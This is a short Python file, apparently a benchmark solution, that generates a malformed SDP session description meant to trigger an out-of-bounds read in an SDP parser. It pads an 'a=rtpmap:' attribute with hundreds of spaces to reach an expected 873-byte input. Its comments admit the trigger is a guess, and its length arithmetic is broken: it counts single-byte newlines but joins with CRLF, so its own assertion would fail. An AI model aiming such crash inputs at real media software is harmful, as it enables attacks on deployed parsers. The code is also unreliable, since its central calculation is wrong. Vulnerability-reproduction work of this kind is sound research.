import os
import tempfile
import subprocess
import sys
from typing import Optional, List

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build a valid SDP that triggers the overflow
        # Create a session description with a malformed attribute
        # that will cause out-of-bounds read when parsing
        
        # Basic SDP structure
        sdp_lines = [
            "v=0",
            "o=- 0 0 IN IP4 127.0.0.1",
            "s=Test Session",
            "t=0 0",
            "m=audio 5004 RTP/AVP 0",
            "c=IN IP4 127.0.0.1",
            "a=rtpmap:0 PCMU/8000",
        ]
        
        # The vulnerability is in parser/sdp where it doesn't check bounds
        # when parsing values. We need to craft an attribute that causes
        # the parser to read beyond allocated buffer.
        
        # Create a malformed attribute with no value after ':' but with
        # additional whitespace that tricks the parser
        vulnerable_line = "a=rtpmap:"
        
        # Add just enough data to fill buffer and cause overflow
        # The exact trigger needs careful crafting
        malicious_payload = vulnerable_line + " " * 800 + "PCMU/8000"
        
        # Replace the valid rtpmap line with malicious one
        sdp_lines[-1] = malicious_payload
        
        # Ensure total length matches ground-truth (873 bytes)
        current_length = sum(len(line) + 1 for line in sdp_lines)  # +1 for newline
        
        # Adjust the payload to hit exactly 873 bytes
        if current_length < 873:
            # Pad the malicious line
            pad_needed = 873 - current_length
            malicious_payload = vulnerable_line + " " * (800 + pad_needed) + "PCMU/8000"
            sdp_lines[-1] = malicious_payload
        elif current_length > 873:
            # Trim the malicious line
            excess = current_length - 873
            malicious_payload = vulnerable_line + " " * (800 - excess) + "PCMU/8000"
            sdp_lines[-1] = malicious_payload
        
        # Join with CRLF as per SDP spec
        sdp_data = "\r\n".join(sdp_lines) + "\r\n"
        
        # Verify length
        assert len(sdp_data) == 873, f"Generated SDP length is {len(sdp_data)}, expected 873"
        
        return sdp_data.encode('ascii')